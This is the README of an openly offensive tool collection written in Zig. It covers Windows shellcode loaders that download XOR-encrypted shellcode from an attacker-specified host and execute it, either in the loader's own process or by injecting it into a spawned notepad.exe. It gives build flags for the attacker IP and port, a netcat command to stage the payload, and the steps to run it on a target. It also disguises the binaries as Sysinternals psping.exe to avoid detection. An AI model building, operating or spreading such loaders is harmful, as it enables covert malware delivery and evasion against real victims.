# offensive zig
> offensive security tools written in zig 

**NOTE**: built w/ zig 0.14.0-dev.138+02b3d5b58

# contents
**utilities**:
- xor.py
	script to xor encrypt shellcode

**shellcode loaders**:
- local
	injects shellcode downloaded from a remote socket in the local process and executes via a function pointer
- remote
	creates a sacrificial *notepad.exe* process, allocates RWX memory, then executes via remote thread

## opsec
> generally this is just a learning tool for me, but i am also trying to implement opsec-aware techniques which reduce detections for payloads

### masking executable metadata
executable metadata is masked to appear as `psping.exe` from Sysinternals, but this can be customized in `metadata.rc` 

## shellcode loaders
#### building
> this will build all payloads as individual `.exe` files

`zig build -Dtarget=x86_64-windows -Dhost="<ip>" -Dport=<port> -Dsize=<payload_size>`

#### running 
1. stage shellcode w netcat
	`sudo nc -vv -l -k -p 80 < payload.bin`
2. download & execute the `.exe` on target
3. profit

### local
#### overview
1. creates a socket using `std.os.windows.ws2_32` and downloads from a remote host & port specified at compile time with the flags shown below
   
2. xor decrypts downloaded shellcode using hardcoded key

3. allocates RWX memory within the current process using `std.os.windows.VirtualAlloc` and copies the shellcode into the region

4. executes the memory by creating a function which points to the base address of the region: `const func: *const fn () callconv(.C) i32 = @ptrCast(memory);`

### remote
#### overview
1. spawns a new *notepad.exe* process in a suspended state and opens a handle to it
   
2. creates a socket using `std.os.windows.ws2_32` and downloads from a remote host & port specified at compile time with the flags shown below
   
3. xor decrypts downloaded shellcode using hardcoded key
   
4. allocates RWX memory in the remote process using `VirtualAllocEx` and write shellcode to the region using `WriteProcessMemory`

5. finally, spawns a remote thread pointed at the memory region of the *notepad.exe* process which contains our shellcode using `NtCreateThreadEx`, then resumes the thread to execute
